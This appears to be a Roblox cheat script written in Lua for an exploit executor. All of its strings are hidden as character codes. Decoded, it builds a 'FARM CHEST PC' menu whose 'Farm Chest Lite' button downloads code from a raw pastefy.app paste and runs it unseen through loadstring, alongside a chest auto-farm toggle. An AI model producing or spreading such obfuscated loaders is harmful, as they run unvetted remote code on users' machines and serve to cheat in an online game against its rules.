local a = string.char;local b = string.byte;local c = string.sub;local d = table.concat;local e = table.insert;local f = tonumber;local g = getgenv;local h = game;local i = pcall;local j = print;local k = Instance.new;local l = pairs;local m = spawn;local n = wait;local o = pcall;local p = firetouchinterest;local q = Color3;local r = UDim2;

g().C = g().C or {A = true, B = true}

if not g().C.A then return end

local function x()
    local s = k(a(83,99,114,101,101,110,71,117,105))
    s.Parent = h.Players.LocalPlayer:WaitForChild(a(80,108,97,121,101,114,71,117,105))

    local t = k(a(70,114,97,109,101))
    t.Size = r.new(0, 300, 0, 450)
    t.Position = r.new(0.5, -150, 0.5, -225)
    t.BackgroundColor3 = q.new(0.2, 0.2, 0.2)
    t.Parent = s

    local u = k(a(85,73,67,111,114,110,101,114))
    u.CornerRadius = UDim.new(0, 15)
    u.Parent = t

    local v = k(a(84,101,120,116,76,97,98,101,108))
    v.Size = r.new(0, 280, 0, 60)
    v.Position = r.new(0.5, -140, 0, 20)
    v.Text = a(70,65,82,77,32,67,72,69,83,84,32,80,67).."\n"..a(68,85,67,75,78,79,86,73,83,32,68,101,118,32,98,121,32,104,52,99,107,110,48,48,98,50,48,50)
    v.TextColor3 = q.new(1, 1, 1)
    v.TextSize = 18
    v.TextWrapped = true
    v.TextYAlignment = Enum.TextYAlignment.Top
    v.BackgroundTransparency = 1
    v.Parent = t

    local w = k(a(84,101,120,116,66,117,116,116,111,110))
    w.Size = r.new(0, 200, 0, 50)
    w.Position = r.new(0.5, -100, 0, 100)
    w.Text = a(70,97,114,109,32,67,104,101,115,116,32,76,105,116,101)
    w.BackgroundColor3 = q.new(0.2, 0.7, 0.2)
    w.TextColor3 = q.new(1, 1, 1)
    w.Parent = t

    w.MouseButton1Click:Connect(function()
        j(a(70,97,114,109,32,67,104,101,115,116,32,76,105,116,101,32,65,99,116,105,118,97,116,101,100))
        loadstring(h:HttpGet(a(104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,107,76,48,102,48,85,117,121,47,114,97,119)))()
    end)

    local x = k(a(84,101,120,116,66,117,116,116,111,110))
    x.Size = r.new(0, 200, 0, 50)
    x.Position = r.new(0.5, -100, 0, 160)
    x.Text = a(83,116,97,114,116,32,70,97,114,109,58,32,79,70,70)
    x.BackgroundColor3 = q.new(0.2, 0.7, 0.2)
    x.TextColor3 = q.new(1, 1, 1)
    x.Parent = t

    local y = false

    x.MouseButton1Click:Connect(function()
        y = not y
        if y then
            x.Text = a(83,116,97,114,116,32,70,97,114,109,58,32,79,78)
            g().D = true
            j(a(67,104,101,115,116,32,70,97,114,109,32,69,110,97,98,108,101,100))
        else
            x.Text = a(83,116,97,114,116,32,70,97,114,109,58,32,79,70,70)
            g().D = false
            j(a(67,104,101,115,116,32,70,97,114,109,32,68,105,115,97,98,108,101,100))
        end
    end)
end

x()
